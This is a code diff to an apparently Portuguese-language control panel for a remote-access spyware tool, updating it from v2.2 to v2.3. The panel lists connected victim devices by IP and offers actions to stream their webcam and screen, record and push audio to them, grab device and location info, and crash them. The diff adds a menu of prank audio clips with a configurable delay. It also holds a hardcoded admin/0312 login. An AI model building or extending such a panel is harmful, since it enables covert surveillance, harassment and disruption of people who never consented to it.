@@ -127,7 +127,7 @@
 
   <!-- Painel -->
   <div id="panel" style="display:none;height:100vh" class="animate__animated animate__fadeIn">
-    <nav class="navbar navbar-dark px-3"><span class="navbar-brand"><i class="fa-solid fa-scarecrow"></i><strong style="color:#e29608">Sukita is the main of DL </strong><strong style="color:#3bff76">v2.2</strong></span></nav>
+    <nav class="navbar navbar-dark px-3"><span class="navbar-brand"><i class="fa-solid fa-scarecrow"></i><strong style="color:#e29608">Sukita is the main of DL </strong><strong style="color:#3bff76">v2.3</strong></span></nav>
     <div class="d-flex" style="height:calc(100% - 56px)">
       <aside class="sidebar p-3">
         <h6 class="fw-semibold mb-3">Conectados agora: <span id="count" class="badge bg-accent2">0</span></h6>
@@ -152,11 +152,8 @@
         <div class="menu-btn" data-action="rec-audio"><i class="fa-solid fa-microphone"></i><span>Gravar áudio</span></div>
         <div class="menu-btn" data-action="stop-audio"><i class="fas fa-volume-mute"></i><span>Stop áudio</span></div>
         <div class="menu-btn" data-action="download-audio"><i class="fa-solid fa-wifi"></i><span>Site de áudios</span></div>
-             <div class="menu-btn" data-action="upload-audio"><i class="fa-solid fa-upload"></i><span>Exportar áudio</span></div>
-       <div class="menu-btn" data-action="troll-audio">
-  <i class="fa-solid fa-upload"></i>
-  <span>Enviar áudio</span>
-</div>
+        <div class="menu-btn" data-action="upload-audio"><i class="fa-solid fa-upload"></i><span>Exportar áudio</span></div>
+        <div class="menu-btn" data-action="troll-audio"><i class="fa-solid fa-paper-plane"></i><span>Enviar áudio</span></div>
         <div class="menu-btn info-btn" data-action="info"><i class="fa-solid fa-map-location-dot"></i><span>Pegar infos</span></div>
         <div class="menu-btn danger-btn" data-action="crash"><i class="fa-solid fa-bug"></i><span>Crashar tudo kkkkk</span></div>
       </div>
@@ -232,35 +229,52 @@
   </div>
 
   <!-- Modal Últimas Atualizações -->
-<div class="modal fade" id="updatesModal" tabindex="-1" aria-labelledby="updatesModalLabel" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-centered">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h5 class="modal-title" id="updatesModalLabel"><strong style="color:#e29608">Sukita is the main of DL <p><strong style="color:#4908e2">ATUALIZADO v2.1</strong></strong></h5>
-        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fechar"></button>
-      </div>
-      <div class="modal-body">
-        <ul>
-         <p><strong style="color:#e20808">- Nova opção de Crashar</strong></p>
-           <p><strong style="color:#000000">- Melhorias de otimização</strong></p>
-            <p><strong style="color:#000000">- Melhorias no visual</strong></p>
-             <p><strong style="color:#000000">- Sukita (script de lição) <p><strong style="color:#088be2">SCRIPT DE LIÇÃO EM TESTE</strong></p></strong></p>
-        </ul>
-      </div>
-      <div class="modal-footer">
-
-        <button type="button" class="bubble" id="updatesLinkBtn">Sukita script</button>
+  <div class="modal fade" id="updatesModal" tabindex="-1" aria-labelledby="updatesModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title" id="updatesModalLabel"><strong style="color:#e29608">Sukita is the main of DL <strong style="color:#4908e2">ATUALIZADO v2.3</strong></strong></h5>
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fechar"></button>
+        </div>
+        <div class="modal-body">
+          <ul>
+            <p><strong style="color:#e20808">- Nova opção de Crashar</strong></p>
+            <p><strong>- Melhorias de otimização</strong></p>
+            <p><strong>- Melhorias no visual</strong></p>
+            <p><strong style="color:#088be2">- Atraso configurável para áudios</strong></p>
+            <p><strong style="color:#088be2">- Lista de áudios prontos</strong></p>
+          </ul>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="bubble" id="updatesLinkBtn">Sukita script</button>
+        </div>
       </div>
     </div>
   </div>
-</div>
 
+  <!-- Modal Escolher Áudio Pronto -->
+  <div class="modal fade" id="selectAudioModal" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content bg-dark text-white border-0">
+        <div class="modal-header border-0">
+          <h5 class="modal-title"><i class="fa-solid fa-music me-2"></i>Enviar áudio pronto</h5>
+          <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+        </div>
+        <div class="modal-body">
+          <div id="audioList" class="list-group mb-3"></div>
+          <div class="mb-3">
+            <label class="form-label">Atraso (segundos):</label>
+            <input type="number" id="audioDelay" class="form-control" min="0" value="0">
+          </div>
+          <button id="sendReadyAudio" class="btn btn-accent w-100">Enviar</button>
+        </div>
+      </div>
+    </div>
+  </div>
 
-  
   <!-- Toasts -->
   <div class="toast-container position-fixed top-0 end-0 p-3"></div>
 
-  
   <!-- Bubble Scripts -->
   <div class="fab"><div class="bubble" id="scriptsBubble"><i class="fa-solid fa-code"></i>Acessar Scripts</div></div>
 
@@ -271,33 +285,6 @@
   <script src="/socket.io/socket.io.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   <script>
-
-document.querySelector('.btn-login').onclick = () => {
-  if ($('user').value.trim() === 'admin' && $('pass').value.trim() === '0312') {
-    document.body.classList.remove('locked');
-    $('login').style.display = 'none';
-    $('splash').style.display = 'flex';
-
-    setTimeout(() => {
-      $('splash').style.display = 'none';
-      $('panel').style.display = 'block';
-
-      // ─────────── MOSTRA O MODAL DE ATUALIZAÇÕES AQUI ───────────
-      const updatesModal = bootstrap.Modal.getOrCreateInstance('#updatesModal');
-      updatesModal.show();
-      // ───────────────────────────────────────────────────────────
-
-    }, 1500);
-  } else {
-    $('error').classList.remove('d-none');
-  }
-};
-
-
-
-
-document.getElementById('scriptsBubble').onclick = () => openOverlay('scriptsOverlay');
-
     /* ======== Const e helpers ======== */
     const socket = io({query:{role:'admin'}});
     const $ = id => document.getElementById(id);
@@ -316,33 +303,50 @@ document.getElementById('scriptsBubble').onclick = () => openOverlay('scriptsOve
     const os = ua => /Windows NT/.test(ua)?'Windows':/Mac OS X/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':/Linux/.test(ua)?'Linux':'—';
 
     /* ======== Login ======== */
-document.querySelector('.btn-login').onclick = () => {
-  if ($('user').value.trim() === 'admin' && $('pass').value.trim() === '0312') {
-    document.body.classList.remove('locked');
-    $('login').style.display = 'none';
-    $('splash').style.display = 'flex';
+    document.querySelector('.btn-login').onclick = () => {
+      if ($('user').value.trim() === 'admin' && $('pass').value.trim() === '0312') {
+        document.body.classList.remove('locked');
+        $('login').style.display = 'none';
+        $('splash').style.display = 'flex';
+        setTimeout(() => {
+          $('splash').style.display = 'none';
+          $('panel').style.display = 'block';
+          bootstrap.Modal.getOrCreateInstance('#updatesModal').show();
+        }, 1500);
+      } else {
+        $('error').classList.remove('d-none');
+      }
+    };
 
-    setTimeout(() => {
-      $('splash').style.display = 'none';
-      $('panel').style.display = 'block';
+    /* ======== Ready audios ======== */
+    const readyAudios = [
+      {name:'Rick Roll', url:'https://files.catbox.moe/9oj8bp.mp3'},
+      {name:'Goal!',     url:'https://files.catbox.moe/l7s7h0.mp3'},
+      {name:'Quero Café',url:'https://files.catbox.moe/308cxe.mp3'}
+    ];
+    function populateReadyAudios(){
+      const list = $('audioList');
+      list.innerHTML='';
+      readyAudios.forEach((a,i)=>{
+        list.insertAdjacentHTML('beforeend',`
+          <label class="list-group-item list-group-item-action d-flex align-items-center gap-2">
+            <input class="form-check-input me-2" type="radio" name="readyAudio" value="${i}" ${i===0?'checked':''}>
+            <span>${a.name}</span>
+          </label>`);
+      });
+    }
 
-      // ─────────── MOSTRA O MODAL DE ATUALIZAÇÕES AQUI ───────────
-      const updatesModal = bootstrap.Modal.getOrCreateInstance('#updatesModal');
-      updatesModal.show();
-      // ───────────────────────────────────────────────────────────
+    $('sendReadyAudio').onclick = () => {
+      const idx = [...document.querySelectorAll('input[name="readyAudio"]')].find(r=>r.checked)?.value;
+      const delay = Math.max(0, parseInt($('audioDelay').value)||0);
+      if(idx==null) return;
+      socket.emit('ready-audio',{uuid:currentUUID,url:readyAudios[idx].url,delay});
+      bootstrap.Modal.getInstance('#selectAudioModal').hide();
+      toast('Áudio enviado','primary');
+    };
 
-    }, 1500);
-  } else {
-    $('error').classList.remove('d-none');
-  }
-};
-
-// botão “Ver detalhes” abre a página em outra aba
-document.getElementById('updatesLinkBtn').onclick = () => {
-  window.open('https://saporraesukita.netlify.app', '_blank');
-};
-
-    
+    /* ======== Botão scripts bubble ======== */
+    $('scriptsBubble').onclick = () => openOverlay('scriptsOverlay');
 
     /* ======== Socket handlers ======== */
     socket.on('clients', arr => {
@@ -355,21 +359,15 @@ document.getElementById('updatesLinkBtn').onclick = () => {
         );
       });
     });
-
-    socket.on('frame', d => {
-      $('img-'+d.id)?.setAttribute('src', d.data);
-    });
-    // Agora o handler de tela aponta para o ID da IMG, não para o container
-    socket.on('screen-frame', d => {
-      $('screen-img-'+d.id)?.setAttribute('src', d.data);
-    });
+    socket.on('frame', d => $('img-'+d.id)?.setAttribute('src', d.data));
+    socket.on('screen-frame', d => $('screen-img-'+d.id)?.setAttribute('src', d.data));
 
     /* ======== Ações de menu ======== */
     $('list').addEventListener('click', e => {
       const row = e.target.closest('.client-row');
       if (!row) return;
       currentUUID = row.dataset.uuid;
-      document.getElementById('menuTitle').textContent = `Menu de: ${cache[currentUUID].ip}`;
+      $('menuTitle').textContent = `Menu de: ${cache[currentUUID].ip}`;
       openOverlay('actionMenu');
     });
 
@@ -379,21 +377,20 @@ document.getElementById('updatesLinkBtn').onclick = () => {
       const act = btn.dataset.action;
       closeOverlay('actionMenu');
       switch (act) {
-        case 'cam':     startStream('cam');   break;
-        case 'screen':  startStream('screen');break;
-        case 'stop-cam':    stopStream('cam');    break;
-        case 'stop-screen': stopStream('screen'); break;
+        case 'cam':         startStream('cam');        break;
+        case 'screen':      startStream('screen');     break;
+        case 'stop-cam':    stopStream('cam');         break;
+        case 'stop-screen': stopStream('screen');      break;
         case 'rec-audio':   bootstrap.Modal.getOrCreateInstance('#recordModal').show(); break;
         case 'stop-audio':  socket.emit('stop-audio', currentUUID); toast('Áudio parado','secondary'); break;
         case 'download-audio': window.open('https://www.myinstants.com/pt/search/?name=MEME','_blank'); break;
         case 'upload-audio':   $('audioFile').click(); break;
+        case 'troll-audio':
+          populateReadyAudios();
+          bootstrap.Modal.getOrCreateInstance('#selectAudioModal').show();
+          break;
         case 'info':      showInfo(); break;
         case 'crash':     crashModal.show(); break;
-        case 'troll-audio':
-  socket.emit('troll-audio', currentUUID);   // pede ao server tocar o áudio fixo
-  toast('Áudio enviado','primary');
-  break;
-
       }
     });
 
@@ -461,18 +458,15 @@ document.getElementById('updatesLinkBtn').onclick = () => {
           <button class="btn-glass btn-min"><i class="fa-solid fa-minus"></i></button>
           <button class="btn-glass btn-stop"><i class="fa-solid fa-xmark"></i></button>
         </div>`;
-      // fullscreen
       card.querySelector('.btn-full').onclick = () => openFull(card);
-      // minimizar
       card.querySelector('.btn-min').onclick = () => {
         if (document.fullscreenElement === card) document.exitFullscreen();
       };
-      // parar
       card.querySelector('.btn-stop').onclick = () => {
         socket.emit(type==='cam'?'stop-stream':'stop-screen', uuid);
         card.remove();
       };
-      document.getElementById('viewer').appendChild(card);
+      $('viewer').appendChild(card);
     }
     function openFull(card) {
       const img = card.querySelector('img');
@@ -491,8 +485,8 @@ document.getElementById('updatesLinkBtn').onclick = () => {
     }
 
     /* ======== Overlay helpers ======== */
-   function openOverlay(id)  { document.getElementById(id).classList.add('show'); }
-function closeOverlay(id) { document.getElementById(id).classList.remove('show'); }
+    function openOverlay(id){ $(id).classList.add('show'); }
+    function closeOverlay(id){ $(id).classList.remove('show'); }
 
     /* ======== Gravar/upload áudio ======== */
     document.getElementById('recordBtn').onclick = async () => {
@@ -501,28 +495,36 @@ function closeOverlay(id) { document.getElementById(id).classList.remove('show')
       chunks = [];
       mediaRecorder.ondataavailable = e => chunks.push(e.data);
       mediaRecorder.onstop = () => {
+        const delay = Math.max(0, parseInt(prompt('Atraso (segundos):','0'))||0);
         const blob = new Blob(chunks,{type:'audio/webm'});
         const fr = new FileReader();
-        fr.onload = () => { socket.emit('custom-audio',{uuid:currentUUID,dataURL:fr.result}); toast('Áudio enviado','primary'); };
+        fr.onload = () => { socket.emit('custom-audio',{uuid:currentUUID,dataURL:fr.result,delay}); toast('Áudio enviado','primary'); };
         fr.readAsDataURL(blob);
       };
       mediaRecorder.start();
-      document.getElementById('recordBtn').classList.add('d-none');
-      document.getElementById('stopBtn').classList.remove('d-none');
+      $('recordBtn').classList.add('d-none');
+      $('stopBtn').classList.remove('d-none');
     };
-    document.getElementById('stopBtn').onclick = () => {
+    $('stopBtn').onclick = () => {
       mediaRecorder.stop();
-      document.getElementById('recordBtn').classList.remove('d-none');
-      document.getElementById('stopBtn').classList.add('d-none');
+      $('recordBtn').classList.remove('d-none');
+      $('stopBtn').classList.add('d-none');
       bootstrap.Modal.getInstance('#recordModal').hide();
     };
-    document.getElementById('audioFile').onchange = e => {
+
+    $('audioFile').onchange = e => {
       const f = e.target.files[0];
       if (!f) return;
+      const delay = Math.max(0, parseInt(prompt('Atraso (segundos):','0'))||0);
       const fr = new FileReader();
-      fr.onload = () => { socket.emit('custom-audio',{uuid:currentUUID,dataURL:fr.result}); toast('Áudio enviado','info'); };
+      fr.onload = () => { socket.emit('custom-audio',{uuid:currentUUID,dataURL:fr.result,delay}); toast('Áudio enviado','info'); };
       fr.readAsDataURL(f);
       e.target.value = '';
+    };
+
+    /* ======== Botão atualização modal ======== */
+    $('updatesLinkBtn').onclick = () => {
+      window.open('https://saporraesukita.netlify.app', '_blank');
     };
   </script>
 </body>
